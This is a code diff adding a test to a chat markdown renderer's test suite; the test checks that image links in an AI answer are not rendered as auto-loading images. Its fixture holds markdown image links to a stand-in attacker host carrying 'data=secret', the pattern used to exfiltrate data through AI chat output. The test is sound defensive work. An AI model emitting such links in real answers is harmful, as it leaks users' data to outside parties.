@@ -44,4 +44,17 @@ describe("chat markdown code blocks", () => {
     expect(html).not.toContain("hljs");
     expect(html).not.toContain('aria-label="Copy code"');
   });
+
+  it("never auto-loads an image the answer points at", () => {
+    const html = renderToStaticMarkup(
+      createElement(Markdown, {
+        content:
+          "![leak](https://attacker.example/collect?data=secret)\n\n![](https://attacker.example/pixel.png)",
+      }),
+    );
+
+    expect(html).not.toContain("<img");
+    expect(html).toContain("https://attacker.example/collect?data=secret");
+    expect(html).toContain("leak");
+  });
 });
